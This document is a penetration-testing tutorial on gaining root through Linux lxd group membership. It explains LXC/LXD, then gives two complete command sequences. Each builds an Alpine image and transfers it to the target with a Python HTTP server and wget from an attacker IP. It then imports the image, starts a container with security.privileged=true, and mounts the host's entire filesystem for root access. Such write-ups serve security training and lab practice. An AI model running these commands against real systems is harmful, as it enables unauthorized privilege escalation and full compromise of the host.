# Exploiting the LXC/LXD Groups
> Container / Instance : OS-level virtualization

> Virtual Machine : Hardwware-level virtualization (via Hypervisor)
> > * *Hosted hypervisor: Vmware, virtualbox, Parallels*
> > * *Native hypervisor: run directly on hardware*

## LXD - LXC ?
* **LXC - Linux Container**: A lightweight virtualization technology, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.
* **LXD - Linux Daemon**: The lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. LXD is an extension that is mainly used for directing the LXC.

*Communication between LXD and LXC is done by using inbuilt libraries, one such library is **`liblxc`**.*


A member of the local **`LXD`** group can instantly escalate the privileges to **`root`**. This is irrespective of whether that user has been granted **`sudo`** rights and **`does not`** require them to enter their password. The vulnerability exists even with the LXD snap package.

LXD is a **`root process`** that carries out actions for anyone with write access to the LXD UNIX socket. It often **does not attempt to match** the privileges of the calling user.

## Identifying the Vulnerability
Need to check if current user belongs to group **lxd** or not? There are multiple methods to check:
```console
kali@kali:~$ id
kali@kali:~$ grep mrrobot /etc/group
```
Or you can use an automated enumeration tools such as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

When the current user is a member of the **LXD** group, meaning he has access to create system containers **as root**.

## Exploitation

The easiest way to exploit this misconfiguration is to build an image of **Alpine** (a lightweight Linux distribution), and start it using the **`security.privileged=true`** flag. This option will force the container to interact as **root** with the host filesystem and therefore allowing to read/write/execute root-level files.

1. On the attacker machine
   
    * Download build-alpine through git repository
    * Build the lastest Alpine image (this step must be executed by the root user)
    * Transfer the tar file to the host machine (can use python server with **`python3 -m http.server`**)
  
2. On the target machine

    * Download the alpine image
    * Import image for lxd
    * Initialize the image inside a new container
    * Mount the container inside the /root directory

### Method 1
Build an Alpine image and start it using the flag **`security.privileged=true`**, forcing the container to interact as root with the host filesystem.

#### Step 1: On local machine
```console
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine 
```
```
❗if the error appears: 

 tar: Ignoring unknown extended header keyword 'APK_TOOLS.checksum.SHA1'
 .....

-> Editting the rootfs/usr/share/alpine-mirrors/MIRRORS.txt file and remove all of the mirrors apart from the first one.
```
Transferring the image in **.tar.gz** format to the target host.
```console
#on local
python3 -m http.server

#on target
wget http://192.168.56.43/alpine-vX.XX.tar.gz
```
#### Step 2: On target machine

❗LXC is **not** in the default bin so lets find out where we need to specify execution from
```console
find / -name lxc
...
/snap/bin/lxc
...
```
Import the image. It’s important doing this from YOUR HOME directory on the victim machine, or it might fail.
```console
/snap/bin/lxc image import ./alpine*.tar.gz --alias root_image

/snap/bin/lxc image list
```
As suggested by LXC, before actually using the image it should be initialized and its **storage pool** should be configured. The default selections will work just fine:
```console
/snap/bin/lxd init 

#or

/snap/bin/lxc storage create pool dir

/snap/bin/lxc profile device add default root disk path=/ pool=pool

/snap/bin/lxc storage list
```
Running image with the **`security.privileged`** flag set to true, which will grant the current user unconditioned root access to it:
```console
/snap/bin/lxc init root_image root_container -c security.privileged=true
```
Mounting the **`/root`** folder into the container (under /mnt/root)
```console
/snap/bin/lxc config device add root_container root_host disk source=/ path=/mnt/root recursive=true 
```
Interacting with the container
```console
/snap/bin/lxc start root_container
/snap/bin/lxc exec root_container /bin/sh
```
Once inside the container, navigate to **`/mnt/root`** to see all resources from the host machine.
```console
cd /mnt/root
#Here is where the filesystem is mounted
```

After running the bash file, we have a different shell, it is the shell of the container. This container has all the files of the host machine.

### Method 2

#### Step 1: On the local machine

Installing this distro builder [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder)
```console
sudo su

# install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

# Clone repo
git clone https://github.com/lxc/distrobuilder
```
Running **`make`** to compile the source code. This will generate the executable program `distrobuilder`, and it will be located at *$HOME/go/bin/distrobuilder*.
```console
cd distrobuilder
make
```
Creating a container image
```console
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
```

Running **`distrobuilder`** to create the container image
```console
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```
After that, we will get 2 files. The `lxd.tar.xz` file is the description of the container image. The `rootfs.squasfs` file is the root filesystem (rootfs) of the container image. The set of these two files is the *`container image`*.

Now, we have to transfer both these files to the target file.

#### Step 2: On the target machine
Add the container image
```console
/snap/bin/lxc image import lxd.tar.xz rootfs.squashfs --alias root_image
/snap/bin/lxc image list
```
Create a container
```console
/snap/bin/lxc init root_image root_container -c security.privileged=true --alias=root_image
/snap/bin/lxc lxc list
```
Mounting the /root folder into the container (under /mnt/root)
```console
/snap/bin/lxc config device add root_container root_host disk source=/ path=/mnt/root recursive=true
```
*❗If appears this Error: No storage pool found. Please create a new storage pool*

Execute the container:
```console
/snap/bin/lxc start root_container
/snap/bin/lxc exec root_container /bin/sh
cd /mnt/root
```
